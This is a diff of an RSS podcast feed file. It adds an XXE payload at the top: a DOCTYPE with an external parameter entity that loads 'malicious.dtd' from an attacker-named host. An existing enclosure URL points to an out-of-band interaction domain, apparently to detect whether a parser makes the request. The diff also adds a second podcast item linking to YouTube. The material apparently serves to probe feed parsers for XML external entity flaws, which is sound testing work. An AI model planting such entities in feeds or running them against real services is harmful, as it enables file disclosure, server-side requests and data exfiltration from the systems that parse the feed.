@@ -1,4 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"http://web-attacker.com/malicious.dtd"> %xxe;]>
 <rss version="2.0"
     xmlns:xtest="http://www.itunes.com/dtds/podcast-1.0.dtd">
   <channel>
@@ -25,6 +27,15 @@
       <description>Keeping your zebra clean is time consuming, but worth the effort.</description>
       <pubDate>Fri, 24 Feb 2017 12:00:00 GMT</pubDate>
       <enclosure url="http://daktjuugetxfexxmsubleucx0ezw6jzcv.oast.fun/Talks_at_Google_-_Andrew_Keen.mp3"
+                 type="audio/mpeg" length="26004388"/>
+      <xtest:duration>22:48</xtest:duration>
+      <guid>dzpodclean</guid>
+    </item>
+       <item>
+      <title>Gizli Youtube</title>
+      <description>Keeping your zebra clean is time consuming, but worth the effort.</description>
+      <pubDate>Fri, 24 Feb 2017 12:00:00 GMT</pubDate>
+      <enclosure url="https://www.youtube.com/watch?v=JiwLPd3JsL0"
                  type="audio/mpeg" length="26004388"/>
       <xtest:duration>22:48</xtest:duration>
       <guid>dzpodclean</guid>
